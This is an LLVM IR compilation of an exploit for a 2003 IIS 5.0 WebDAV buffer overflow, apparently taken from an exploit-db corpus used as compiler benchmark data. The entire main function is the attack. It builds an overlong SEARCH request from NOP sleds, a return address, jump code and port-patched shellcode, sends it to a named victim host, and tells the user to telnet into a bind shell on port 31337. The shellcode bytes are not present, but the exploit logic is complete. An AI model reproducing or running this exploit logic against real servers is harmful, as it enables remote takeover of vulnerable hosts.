; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { i8*, i32, i32 }
%struct.sockaddr = type { i32 }

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [182 x i8] c"IIS 5.0 WebDAV Exploit by RoMaNSoFt <roman@rs-labs.com>. 23/03/2003\0AUsage: %s <target host> [target port] [bind port] [ret]\0AE.g 1: %s victim.com\0AE.g 2: %s victim.com 80 31337 %#.4x\0A\00", align 1
@RET = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [85 x i8] c"RET value must be in 0x0000-0xffff range and it may not contain null-bytes\0AAborted!\0A\00", align 1
@.str.2 = private unnamed_addr constant [61 x i8] c"Binding-port contains null-byte. Use another port.\0AAborted!\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@PORT_OFFSET = common dso_local global i64 0, align 8
@LOADLIBRARYA = common dso_local global i32 0, align 4
@LOADL_OFFSET = common dso_local global i64 0, align 8
@GETPROCADDRESS = common dso_local global i32 0, align 4
@GETPROC_OFFSET = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [28 x i8] c"[*] Resolving hostname ...\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%s: unknown hostname\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c"Failed to create socket\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"Failed to connect\00", align 1
@.str.7 = private unnamed_addr constant [50 x i8] c"[*] Attacking port %i at %s (EIP = %#.4x%.4x)...\0A\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"SEARCH /\00", align 1
@NOP = common dso_local global i32 0, align 4
@jumpcode = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [12 x i8] c" HTTP/1.1\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [57 x i8] c"Host: %s\0D\0AContent-Type: text/xml\0D\0AContent-Length: %d\0D\0A\0D\0A\00", align 1
@body = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [15 x i8] c"Failed to send\00", align 1
@.str.12 = private unnamed_addr constant [85 x i8] c"[*] Now open another console/shell and try to connect (telnet) to victim port %i...\0A\00", align 1
@.str.13 = private unnamed_addr constant [98 x i8] c"[*] Victim server issued the following %d bytes of response:\0A--\0A%s\0A--\0A[*] Server NOT vulnerable!\0A\00", align 1
@.str.14 = private unnamed_addr constant [122 x i8] c"[*] Server is vulnerable but the exploit failed! Change RET value (e.g. 0xce04) and try again (when IIS is up again) :-/\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.hostent*, align 8
  %16 = alloca %struct.sockaddr_in, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @MAXBUF, align 4
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %17, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %18, align 8
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %28, label %25

25:                                               ; preds = %2
  %26 = load i32, i32* %4, align 4
  %27 = icmp sgt i32 %26, 5
  br i1 %27, label %28, label %41

28:                                               ; preds = %25, %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = load i32, i32* @RET, align 4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str, i64 0, i64 0), i8* %31, i8* %34, i8* %37, i32 %38)
  %40 = call i32 @exit(i32 -1) #4
  unreachable

41:                                               ; preds = %25
  %42 = load i32, i32* %4, align 4
  %43 = icmp sgt i32 %42, 2
  br i1 %43, label %44, label %49

44:                                               ; preds = %41
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %8, align 4
  br label %50

49:                                               ; preds = %41
  store i32 80, i32* %8, align 4
  br label %50

50:                                               ; preds = %49, %44
  %51 = load i32, i32* %4, align 4
  %52 = icmp sgt i32 %51, 3
  br i1 %52, label %53, label %58

53:                                               ; preds = %50
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 3
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @atoi(i8* %56)
  store i32 %57, i32* %9, align 4
  br label %59

58:                                               ; preds = %50
  store i32 31337, i32* %9, align 4
  br label %59

59:                                               ; preds = %58, %53
  %60 = load i32, i32* %4, align 4
  %61 = icmp sgt i32 %60, 4
  br i1 %61, label %62, label %67

62:                                               ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 4
  %65 = load i8*, i8** %64, align 8
  %66 = call i64 @strtoul(i8* %65, i32* null, i32 16)
  store i64 %66, i64* %6, align 8
  br label %70

67:                                               ; preds = %59
  %68 = load i32, i32* @RET, align 4
  %69 = sext i32 %68 to i64
  store i64 %69, i64* %6, align 8
  br label %70

70:                                               ; preds = %67, %62
  %71 = load i64, i64* %6, align 8
  %72 = icmp ugt i64 %71, 65535
  br i1 %72, label %81, label %73

73:                                               ; preds = %70
  %74 = load i64, i64* %6, align 8
  %75 = and i64 %74, 255
  %76 = icmp eq i64 %75, 0
  br i1 %76, label %81, label %77

77:                                               ; preds = %73
  %78 = load i64, i64* %6, align 8
  %79 = and i64 %78, 65280
  %80 = icmp eq i64 %79, 0
  br i1 %80, label %81, label %85

81:                                               ; preds = %77, %73, %70
  %82 = load i32, i32* @stderr, align 4
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %82, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.1, i64 0, i64 0))
  %84 = call i32 @exit(i32 -2) #4
  unreachable

85:                                               ; preds = %77
  %86 = load i32, i32* %9, align 4
  %87 = call i8* @htons(i32 %86)
  %88 = ptrtoint i8* %87 to i16
  store i16 %88, i16* %7, align 2
  %89 = load i16, i16* %7, align 2
  %90 = zext i16 %89 to i32
  %91 = xor i32 %90, 39321
  %92 = trunc i32 %91 to i16
  store i16 %92, i16* %7, align 2
  %93 = load i16, i16* %7, align 2
  %94 = zext i16 %93 to i32
  %95 = and i32 %94, 255
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %102, label %97

97:                                               ; preds = %85
  %98 = load i16, i16* %7, align 2
  %99 = zext i16 %98 to i32
  %100 = and i32 %99, 65280
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %106

102:                                              ; preds = %97, %85
  %103 = load i32, i32* @stderr, align 4
  %104 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.2, i64 0, i64 0))
  %105 = call i32 @exit(i32 -3) #4
  unreachable

106:                                              ; preds = %97
  %107 = load i16, i16* %7, align 2
  %108 = load i8*, i8** @shellcode, align 8
  %109 = load i64, i64* @PORT_OFFSET, align 8
  %110 = getelementptr inbounds i8, i8* %108, i64 %109
  %111 = bitcast i8* %110 to i16*
  store i16 %107, i16* %111, align 2
  %112 = load i32, i32* @LOADLIBRARYA, align 4
  %113 = xor i32 %112, -1717986919
  %114 = zext i32 %113 to i64
  %115 = load i8*, i8** @shellcode, align 8
  %116 = load i64, i64* @LOADL_OFFSET, align 8
  %117 = getelementptr inbounds i8, i8* %115, i64 %116
  %118 = bitcast i8* %117 to i64*
  store i64 %114, i64* %118, align 8
  %119 = load i32, i32* @GETPROCADDRESS, align 4
  %120 = xor i32 %119, -1717986919
  %121 = zext i32 %120 to i64
  %122 = load i8*, i8** @shellcode, align 8
  %123 = load i64, i64* @GETPROC_OFFSET, align 8
  %124 = getelementptr inbounds i8, i8* %122, i64 %123
  %125 = bitcast i8* %124 to i64*
  store i64 %121, i64* %125, align 8
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %127 = load i8**, i8*** %5, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 1
  %129 = load i8*, i8** %128, align 8
  %130 = call %struct.hostent* @gethostbyname(i8* %129)
  store %struct.hostent* %130, %struct.hostent** %15, align 8
  %131 = icmp eq %struct.hostent* %130, null
  br i1 %131, label %132, label %139

132:                                              ; preds = %106
  %133 = load i32, i32* @stderr, align 4
  %134 = load i8**, i8*** %5, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %133, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i8* %136)
  %138 = call i32 @exit(i32 -4) #4
  unreachable

139:                                              ; preds = %106
  %140 = load %struct.hostent*, %struct.hostent** %15, align 8
  %141 = getelementptr inbounds %struct.hostent, %struct.hostent* %140, i32 0, i32 1
  %142 = load i32, i32* %141, align 4
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %144 = load %struct.hostent*, %struct.hostent** %15, align 8
  %145 = getelementptr inbounds %struct.hostent, %struct.hostent* %144, i32 0, i32 0
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @bcopy(i32 %142, i32* %143, i32 %146)
  %148 = load i32, i32* @AF_INET, align 4
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i32 %148, i32* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = call i8* @htons(i32 %150)
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i8* %151, i8** %152, align 8
  %153 = load i32, i32* @AF_INET, align 4
  %154 = load i32, i32* @SOCK_STREAM, align 4
  %155 = call i32 @socket(i32 %153, i32 %154, i32 0)
  store i32 %155, i32* %10, align 4
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %157, label %160

157:                                              ; preds = %139
  %158 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %159 = call i32 @exit(i32 -5) #4
  unreachable

160:                                              ; preds = %139
  %161 = load i32, i32* %10, align 4
  %162 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %163 = call i32 @connect(i32 %161, %struct.sockaddr* %162, i32 16)
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %165, label %168

165:                                              ; preds = %160
  %166 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  %167 = call i32 @exit(i32 -6) #4
  unreachable

168:                                              ; preds = %160
  %169 = load i32, i32* %8, align 4
  %170 = load i8**, i8*** %5, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 1
  %172 = load i8*, i8** %171, align 8
  %173 = load i64, i64* %6, align 8
  %174 = lshr i64 %173, 8
  %175 = and i64 %174, 255
  %176 = load i64, i64* %6, align 8
  %177 = and i64 %176, 255
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.7, i64 0, i64 0), i32 %169, i8* %172, i64 %175, i64 %177)
  %179 = load i32, i32* @MAXBUF, align 4
  %180 = call i32 @bzero(i8* %22, i32 %179)
  %181 = call i32 @strcpy(i8* %22, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0))
  %182 = call i32 @strlen(i8* %22)
  store i32 %182, i32* %11, align 4
  %183 = load i32, i32* @NOP, align 4
  %184 = trunc i32 %183 to i8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %22, i64 %186
  store i8 %184, i8* %187, align 1
  %188 = load i32, i32* %11, align 4
  %189 = add nsw i32 %188, 1
  store i32 %189, i32* %12, align 4
  br label %190

190:                                              ; preds = %202, %168
  %191 = load i32, i32* %12, align 4
  %192 = load i32, i32* %11, align 4
  %193 = add nsw i32 %192, 2150
  %194 = icmp slt i32 %191, %193
  br i1 %194, label %195, label %205

195:                                              ; preds = %190
  %196 = load i64, i64* %6, align 8
  %197 = trunc i64 %196 to i16
  %198 = load i32, i32* %12, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8, i8* %22, i64 %199
  %201 = bitcast i8* %200 to i16*
  store i16 %197, i16* %201, align 1
  br label %202

202:                                              ; preds = %195
  %203 = load i32, i32* %12, align 4
  %204 = add nsw i32 %203, 2
  store i32 %204, i32* %12, align 4
  br label %190

205:                                              ; preds = %190
  br label %206

206:                                              ; preds = %220, %205
  %207 = load i32, i32* %12, align 4
  %208 = load i32, i32* %11, align 4
  %209 = add nsw i32 %208, 65535
  %210 = load i8*, i8** @jumpcode, align 8
  %211 = call i32 @strlen(i8* %210)
  %212 = sub nsw i32 %209, %211
  %213 = icmp slt i32 %207, %212
  br i1 %213, label %214, label %223

214:                                              ; preds = %206
  %215 = load i32, i32* @NOP, align 4
  %216 = trunc i32 %215 to i8
  %217 = load i32, i32* %12, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i8, i8* %22, i64 %218
  store i8 %216, i8* %219, align 1
  br label %220

220:                                              ; preds = %214
  %221 = load i32, i32* %12, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %12, align 4
  br label %206

223:                                              ; preds = %206
  %224 = load i32, i32* %12, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds i8, i8* %22, i64 %225
  %227 = load i8*, i8** @jumpcode, align 8
  %228 = load i8*, i8** @jumpcode, align 8
  %229 = call i32 @strlen(i8* %228)
  %230 = call i32 @memcpy(i8* %226, i8* %227, i32 %229)
  %231 = call i32 @strlen(i8* %22)
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds i8, i8* %22, i64 %232
  %234 = call i32 @strcpy(i8* %233, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %235 = call i32 @strlen(i8* %22)
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds i8, i8* %22, i64 %236
  %238 = load i8**, i8*** %5, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 1
  %240 = load i8*, i8** %239, align 8
  %241 = load i8*, i8** @body, align 8
  %242 = call i32 @strlen(i8* %241)
  %243 = load i8*, i8** @shellcode, align 8
  %244 = call i32 @strlen(i8* %243)
  %245 = add nsw i32 %242, %244
  %246 = call i32 @sprintf(i8* %237, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.10, i64 0, i64 0), i8* %240, i32 %245)
  %247 = call i32 @strlen(i8* %22)
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds i8, i8* %22, i64 %248
  %250 = load i8*, i8** @body, align 8
  %251 = call i32 @strcpy(i8* %249, i8* %250)
  %252 = call i32 @strlen(i8* %22)
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i8, i8* %22, i64 %253
  %255 = call i32 @memset(i8* %254, i32 1, i32 1)
  %256 = call i32 @strlen(i8* %22)
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds i8, i8* %22, i64 %257
  %259 = load i32, i32* @NOP, align 4
  %260 = call i32 @memset(i8* %258, i32 %259, i32 3)
  %261 = call i32 @strlen(i8* %22)
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %22, i64 %262
  %264 = load i8*, i8** @shellcode, align 8
  %265 = call i32 @strcpy(i8* %263, i8* %264)
  %266 = load i32, i32* %10, align 4
  %267 = call i32 @strlen(i8* %22)
  %268 = call i32 @send(i32 %266, i8* %22, i32 %267, i32 0)
  %269 = call i32 @strlen(i8* %22)
  %270 = icmp ne i32 %268, %269
  br i1 %270, label %271, label %274

271:                                              ; preds = %223
  %272 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0))
  %273 = call i32 @exit(i32 -7) #4
  unreachable

274:                                              ; preds = %223
  %275 = load i32, i32* %9, align 4
  %276 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.12, i64 0, i64 0), i32 %275)
  br label %277

277:                                              ; preds = %286, %274
  %278 = load i32, i32* %10, align 4
  %279 = load i32, i32* %14, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds i8, i8* %22, i64 %280
  %282 = load i32, i32* @MAXBUF, align 4
  %283 = sub nsw i32 %282, 1
  %284 = call i32 @recv(i32 %278, i8* %281, i32 %283, i32 0)
  store i32 %284, i32* %13, align 4
  %285 = icmp sgt i32 %284, 0
  br i1 %285, label %286, label %290

286:                                              ; preds = %277
  %287 = load i32, i32* %13, align 4
  %288 = load i32, i32* %14, align 4
  %289 = add nsw i32 %288, %287
  store i32 %289, i32* %14, align 4
  br label %277

290:                                              ; preds = %277
  %291 = load i32, i32* %14, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds i8, i8* %22, i64 %292
  store i8 0, i8* %293, align 1
  %294 = load i32, i32* %14, align 4
  %295 = icmp sgt i32 %294, 0
  br i1 %295, label %296, label %299

296:                                              ; preds = %290
  %297 = load i32, i32* %14, align 4
  %298 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.13, i64 0, i64 0), i32 %297, i8* %22)
  br label %302

299:                                              ; preds = %290
  %300 = load i32, i32* %9, align 4
  %301 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.14, i64 0, i64 0), i32 %300)
  br label %302

302:                                              ; preds = %299, %296
  %303 = load i32, i32* %10, align 4
  %304 = call i32 @close(i32 %303)
  %305 = load i8*, i8** %17, align 8
  call void @llvm.stackrestore(i8* %305)
  %306 = load i32, i32* %3, align 4
  ret i32 %306
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @strtoul(i8*, i32*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i8* @htons(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @bcopy(i32, i32*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
